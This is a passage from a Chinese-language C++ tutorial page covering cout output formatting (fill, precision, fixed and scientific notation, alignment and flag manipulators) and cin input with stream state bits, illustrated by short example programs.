class="built_in">endl</span>; <span class="comment">// 输出 *    42*</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span>.fill(<span class="string">&#x27;*&#x27;</span>); <span class="comment">// 设置填充字符为 &#x27;*&#x27;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Star fill: *&quot;</span> &lt;&lt; <span class="built_in">std</span>::setw(<span class="number">6</span>) &lt;&lt; num &lt;&lt; <span class="string">&quot;*&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 ****42*</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 setfill</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Dash fill: *&quot;</span> &lt;&lt; <span class="built_in">std</span>::setfill(<span class="string">&#x27;-&#x27;</span>) &lt;&lt; <span class="built_in">std</span>::setw(<span class="number">6</span>) &lt;&lt; num &lt;&lt; <span class="string">&quot;*&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 ----42*</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span>.fill(<span class="string">&#x27; &#x27;</span>); <span class="comment">// 恢复默认填充字符</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="4-浮点数精度-precision-setprecision"><a href="#4-浮点数精度-precision-setprecision" class="headerlink" title="4. 浮点数精度 (precision(), setprecision())"></a>4. 浮点数精度 (<code>precision()</code>, <code>setprecision()</code>)</h4><p>可以控制浮点数输出的<strong>小数位数</strong>或<strong>总有效数字位数</strong>，具体取决于浮点数格式（见下文）。</p><ul><li>  <strong><code>cout.precision(int p)</code> (成员函数):</strong> 设置精度为 <code>p</code>。返回之前的精度值。默认精度通常是 6。这个设置是<strong>粘性</strong>的。</li><li>  <strong><code>setprecision(int p)</code> (操纵符, <code>&lt;iomanip&gt;</code>):</strong> 设置精度为 <code>p</code>。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iomanip&gt; // for setprecision</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt;   // for M_PI</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">double</span> pi = M_PI; <span class="comment">// 大约 3.14159265...</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Default precision: &quot;</span> &lt;&lt; pi &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 通常输出 6 位有效数字</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span>.precision(<span class="number">4</span>); <span class="comment">// 设置精度为 4</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Precision 4: &quot;</span> &lt;&lt; pi &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 3.142 (默认模式下是有效数字)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 setprecision</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Precision 8: &quot;</span> &lt;&lt; <span class="built_in">std</span>::setprecision(<span class="number">8</span>) &lt;&lt; pi &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 3.1415927</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span>.precision(<span class="number">6</span>); <span class="comment">// 恢复默认精度</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="5-浮点数格式-setf-unsetf-fixed-scientific"><a href="#5-浮点数格式-setf-unsetf-fixed-scientific" class="headerlink" title="5. 浮点数格式 (setf(), unsetf(), fixed, scientific)"></a>5. 浮点数格式 (<code>setf()</code>, <code>unsetf()</code>, <code>fixed</code>, <code>scientific</code>)</h4><p>可以控制浮点数是以<strong>定点表示法 (fixed)</strong> 还是<strong>科学计数法 (scientific)</strong> 显示。</p><ul><li>  <strong><code>fixed</code> (操纵符):</strong> 使用定点表示法。此时，<code>precision()</code> 控制的是<strong>小数点后</strong>的位数。</li><li>  <strong><code>scientific</code> (操纵符):</strong> 使用科学计数法（例如 <code>1.23e+04</code>）。此时，<code>precision()</code> 控制的是<strong>小数点后</strong>的位数。</li><li>  <strong>默认格式:</strong> 如果既未设置 <code>fixed</code> 也未设置 <code>scientific</code>，则 <code>cout</code> 会自动选择一种格式（定点或科学计数法），以产生更紧凑的表示。此时，<code>precision()</code> 控制的是<strong>总的有效数字</strong>位数（整数部分+小数部分）。</li><li>  <strong><code>ios_base::floatfield</code>:</strong> <code>fixed</code> 和 <code>scientific</code> 都是格式标志位。可以使用 <code>cout.setf(ios_base::fixed, ios_base::floatfield)</code> 和 <code>cout.setf(ios_base::scientific, ios_base::floatfield)</code> 来设置，使用 <code>cout.unsetf(ios_base::floatfield)</code> 来清除设置恢复默认行为。使用操纵符通常更简单。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iomanip&gt; // for fixed, scientific, setprecision</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">double</span> num1 = <span class="number">12345.6789</span>;</span><br><span class="line">    <span class="keyword">double</span> num2 = <span class="number">0.000012345</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::setprecision(<span class="number">5</span>); <span class="comment">// 设置精度为 5</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Default format:\n&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; num1 &lt;&lt; <span class="string">&quot;\t&quot;</span> &lt;&lt; num2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 123461.2345e-05 (精度5表示有效数字)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::fixed; <span class="comment">// 设置为定点格式</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Fixed format:\n&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; num1 &lt;&lt; <span class="string">&quot;\t&quot;</span> &lt;&lt; num2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 12345.678900.00001 (精度5表示小数位数)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::scientific; <span class="comment">// 设置为科学计数法格式</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Scientific format:\n&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; num1 &lt;&lt; <span class="string">&quot;\t&quot;</span> &lt;&lt; num2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 1.23457e+041.23450e-05 (精度5表示小数位数)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 恢复默认格式 (需要清除 floatfield)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span>.unsetf(<span class="built_in">std</span>::ios_base::floatfield);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Back to default format:\n&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; num1 &lt;&lt; <span class="string">&quot;\t&quot;</span> &lt;&lt; num2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 123461.2345e-05</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="6-其他格式标志和操纵符"><a href="#6-其他格式标志和操纵符" class="headerlink" title="6. 其他格式标志和操纵符"></a>6. 其他格式标志和操纵符</h4><ul><li><p><strong>对齐方式 (<code>left</code>, <code>right</code>, <code>internal</code>):</strong></p><ul><li><p>  <code>left</code>: 在字段内左对齐输出，填充字符放在右边。</p></li><li><p>  <code>right</code>: 在字段内右对齐输出，填充字符放在左边（默认）。</p></li><li><p>  <code>internal</code>: 符号（正负号或基数前缀）左对齐，数值右对齐，填充字符放在中间。</p></li><li><p>可以通过 <code>setf()</code> 设置 <code>ios_base::left</code>, <code>ios_base::right</code>, <code>ios_base::internal</code> 标志，或使用同名操纵符。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;*&quot;</span> &lt;&lt; <span class="built_in">std</span>::setw(<span class="number">10</span>) &lt;&lt; <span class="built_in">std</span>::left &lt;&lt; <span class="string">&quot;Hi&quot;</span> &lt;&lt; <span class="string">&quot;*&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;  <span class="comment">// 输出 *Hi        *</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;*&quot;</span> &lt;&lt; <span class="built_in">std</span>::setw(<span class="number">10</span>) &lt;&lt; <span class="built_in">std</span>::right &lt;&lt; <span class="number">-12</span> &lt;&lt; <span class="string">&quot;*&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 *       -12*</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;*&quot;</span> &lt;&lt; <span class="built_in">std</span>::setw(<span class="number">10</span>) &lt;&lt; <span class="built_in">std</span>::internal &lt;&lt; <span class="number">-12</span> &lt;&lt; <span class="string">&quot;*&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 *-       12*</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::right; <span class="comment">// 恢复默认右对齐</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>显示小数点 (<code>showpoint</code>, <code>noshowpoint</code>):</strong></p><ul><li><p>  <code>showpoint</code>: 强制显示浮点数的小数点和末尾的零（即使小数部分为零）。</p></li><li><p><code>noshowpoint</code>: 不强制显示（默认）。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::fixed &lt;&lt; <span class="built_in">std</span>::setprecision(<span class="number">2</span>);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Default: &quot;</span> &lt;&lt; <span class="number">12.0</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 可能输出 12 (取决于实现)</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::showpoint;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Showpoint: &quot;</span> &lt;&lt; <span class="number">12.0</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 12.00</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::noshowpoint;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>显示正号 (<code>showpos</code>, <code>noshowpos</code>):</strong></p><ul><li><p>  <code>showpos</code>: 对于非负数，在前面显示 <code>+</code> 号。</p></li><li><p><code>noshowpos</code>: 不显示正号（默认）。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; +<span class="number">10</span> &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; <span class="number">-10</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 10 -10</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::showpos;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; +<span class="number">10</span> &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; <span class="number">-10</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 +10 -10</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::noshowpos;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>布尔值格式 (<code>boolalpha</code>, <code>noboolalpha</code>):</strong></p><ul><li><p>  <code>boolalpha</code>: 将 <code>bool</code> 值输出为字符串 “true” 或 “false”。</p></li><li><p><code>noboolalpha</code>: 将 <code>bool</code> 值输出为整数 1 或 0（默认）。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bool</span> flag = <span class="literal">true</span>;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Default bool: &quot;</span> &lt;&lt; flag &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 1</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::boolalpha;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Boolalpha: &quot;</span> &lt;&lt; flag &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 true</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::noboolalpha;</span><br></pre></td></tr></table></figure></li></ul></li></ul><h4 id="7-设置格式-setf"><a href="#7-设置格式-setf" class="headerlink" title="7. 设置格式 (setf())"></a>7. 设置格式 (<code>setf()</code>)</h4><p><code>setf()</code> 是一个更底层的设置格式标志的方法。它有两个版本：</p><ul><li>  <code>fmtflags setf(fmtflags flags)</code>: 设置 <code>flags</code> 中指定的位。例如 <code>cout.setf(ios_base::showpos)</code>。</li><li>  <code>fmtflags setf(fmtflags flags, fmtflags mask)</code>: 先清除 <code>mask</code> 中指定的位，然后设置 <code>flags</code> 中指定的位。这用于设置互斥的标志组，如对齐方式 (<code>adjustfield</code>) 或浮点数格式 (<code>floatfield</code>)。例如 <code>cout.setf(ios_base::left, ios_base::adjustfield)</code>。</li></ul><p>虽然 <code>setf()</code> 提供了完全的控制，但使用操纵符通常更易读、更方便。</p><p><strong>保存和恢复格式状态:</strong> 有时你可能想临时改变格式，之后再恢复。可以保存 <code>flags()</code> 和 <code>precision()</code> 的值，之后再用 <code>flags(old_flags)</code> 和 <code>precision(old_precision)</code> 恢复。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 保存当前格式状态</span></span><br><span class="line">    <span class="built_in">std</span>::ios_base::fmtflags original_flags = <span class="built_in">std</span>::<span class="built_in">cout</span>.flags();</span><br><span class="line">    <span class="built_in">std</span>::streamsize original_precision = <span class="built_in">std</span>::<span class="built_in">cout</span>.precision();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 进行一些格式化输出</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::fixed &lt;&lt; <span class="built_in">std</span>::setprecision(<span class="number">2</span>) &lt;&lt; <span class="built_in">std</span>::showpos;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Formatted: &quot;</span> &lt;&lt; <span class="number">12.345</span> &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; <span class="number">-6.7</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 恢复原始格式状态</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span>.flags(original_flags);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span>.precision(original_precision);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Restored: &quot;</span> &lt;&lt; <span class="number">12.345</span> &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; <span class="number">-6.7</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过组合使用这些格式化工具，可以精确地控制 <code>cout</code> 输出数据的外观。</p><h2 id="17-3-使用-cin-进行输入"><a href="#17-3-使用-cin-进行输入" class="headerlink" title="17.3 使用 cin 进行输入"></a>17.3 使用 cin 进行输入</h2><p><code>std::cin</code> 是 C++ 标准库 <code>&lt;iostream&gt;</code> 中预定义的一个 <code>istream</code> 类的全局对象，通常连接到标准输入设备（如键盘）。它是 C++ 中获取用户输入的主要方式。</p><p><code>cin</code> 最常见的用法是配合<strong>提取运算符 (<code>&gt;&gt;</code>)</strong> 使用。这个运算符也被重载以接受各种基本数据类型（<code>int</code>, <code>float</code>, <code>double</code>, <code>char</code> 等）以及 <code>std::string</code> 和 C 风格字符数组。</p><p><strong><code>cin &gt;&gt;</code> 的工作方式:</strong></p><ol><li> <strong>跳过空白:</strong> <code>&gt;&gt;</code> 运算符默认会<strong>跳过</strong>输入流中所有前导的<strong>空白字符</strong>（空格、制表符、换行符）。</li><li> <strong>读取和转换:</strong> 它会根据目标变量的类型，从缓冲区读取非空白字符，并尝试将这些字符转换为目标类型的值。</li><li> <strong>停止读取:</strong> 读取会在遇到<strong>不适合</strong>目标类型的字符（例如，读取 <code>int</code> 时遇到字母）或下一个<strong>空白字符</strong>时停止。</li><li> <strong>存储值:</strong> 成功转换的值被存储在目标变量中。</li><li> <strong>留下分隔符:</strong> 导致读取停止的那个不合适的字符或空白字符会<strong>留在</strong>输入缓冲区中，等待下一次读取。</li></ol><p><strong>示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">double</span> price;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> name;</span><br><span class="line">    <span class="keyword">char</span> initial;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter age, price, initial, and name (separated by spaces): &quot;</span>;</span><br><span class="line">    <span class="comment">// Example input: 30 99.99 J Doe</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; age &gt;&gt; price &gt;&gt; initial &gt;&gt; name; <span class="comment">// 可以链接读取</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\n--- You entered ---&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Age: &quot;</span> &lt;&lt; age &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;       <span class="comment">// Output: 30</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Price: &quot;</span> &lt;&lt; price &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;   <span class="comment">// Output: 99.99</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Initial: &quot;</span> &lt;&lt; initial &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// Output: J</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Name: &quot;</span> &lt;&lt; name &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;     <span class="comment">// Output: Doe (只读取到空格前)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 此时，输入缓冲区中可能还留有 &quot; Doe&quot; 后面的换行符</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="17-3-1-cin-gt-gt-如何检查输入"><a href="#17-3-1-cin-gt-gt-如何检查输入" class="headerlink" title="17.3.1 cin &gt;&gt; 如何检查输入"></a>17.3.1 cin &gt;&gt; 如何检查输入</h3><p><code>cin &gt;&gt;</code> 表达式本身会返回 <code>cin</code> 对象 (<code>istream&amp;</code>)。C++ 允许在需要布尔值的地方（如 <code>if</code> 或 <code>while</code> 条件）使用流对象。当流对象被用作条件时，它会检查流的**状态 (state)**。如果流处于“良好”状态（没有发生错误），条件为 <code>true</code>；如果流发生错误（如读取失败、到达文件末尾），条件为 <code>false</code>。</p><p>这使得可以编写如下循环：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> value;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter numbers (non-number to quit): &quot;</span>;</span><br><span class="line">    <span class="comment">// 当 cin &gt;&gt; value 成功读取一个整数时，cin 状态良好，循环继续</span></span><br><span class="line">    <span class="comment">// 当输入非数字导致读取失败时，cin 进入 fail 状态，循环终止</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; value) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;You entered: &quot;</span> &lt;&lt; value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter next number: &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Input terminated or failed.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="17-3-2-流状态"><a href="#17-3-2-流状态" class="headerlink" title="17.3.2 流状态"></a>17.3.2 流状态</h3><p><code>istream</code> 类（以及 <code>ostream</code> 和 <code>ios</code>）内部维护一组<strong>状态位 (state flags)</strong> 来表示流的当前状态。这些状态位定义在 <code>ios_base</code> 类中，类型为 <code>iostate</code> (一种位掩码类型)。</p><p>主要的状态位有：</p><ul><li>  <strong><code>goodbit</code>:</strong> 表示流处于正常状态，没有发生错误。值为 0。</li><li>  <strong><code>eofbit</code>:</strong> 表示已到达输入流的**末尾 (End Of File)**。当尝试从文件末尾或关闭的输入流读取时设置。</li><li>  <strong><code>failbit</code>:</strong> 表示发生<strong>可恢复</strong>的格式错误。通常是因为输入的数据格式与期望读取的类型不匹配（例如，期望 <code>int</code> 但输入了字母）。设置 <code>failbit</code> 后，后续的 I/O 操作通常会失败，直到流状态被清除。</li><li>  <strong><code>badbit</code>:</strong> 表示发生<strong>不可恢复</strong>的严重错误，可能涉及流本身的损坏或底层 I/O 操作失败（例如，读取磁盘时发生硬件错误）。</li></ul><p>一个流可能同时设置了多个状态位（例如，在文件末尾尝试读取失败可能同时设置 <code>eofbit</code> 和 <code>failbit</code>）。</p><p><strong>检查流状态的成员函数:</strong></p><ul><li>  <strong><code>good()</code>:</strong> 如果流状态为 <code>goodbit</code>（即所有错误位都未设置），返回 <code>true</code>。</li><li>  <strong><code>eof()</code>:</strong> 如果设置了 <code>eofbit</code>，返回 <code>true</code>。</li><li>  <strong><code>fail()</code>:</strong> 如果设置了 <code>failbit</code> <strong>或</strong> <code>badbit</code>，返回 <code>true</code>。这是检查读取操作是否失败的最常用方法。</li><li>  <strong><code>bad()</code>:</strong> 如果设置了 <code>badbit</code>，返回 <code>true</code>。</li><li>  <strong><code>rdstate()</code>:</strong> 返回当前所有状态位的组合（一个 <code>iostate</code> 值）。</li><li>  <strong><code>operator bool()</code>:</strong> 重载的布尔转换运算符。如果 <code>fail()</code> 返回 <code>false</code>，则转换为 <code>true</code>；否则转换为 <code>false</code>。这就是为什么可以在 <code>if(cin)</code> 或 <code>while(cin &gt;&gt; value)</code> 中使用流对象的原因。</li><li>  <strong><code>operator!()</code>:</strong> 重载的逻辑非运算符。如果 <code>fail()</code> 返回 <code>true</code>，则 <code>!cin</code> 为 <code>true</code>。</li></ul><p><strong>清除流状态:</strong></p><p>当流进入 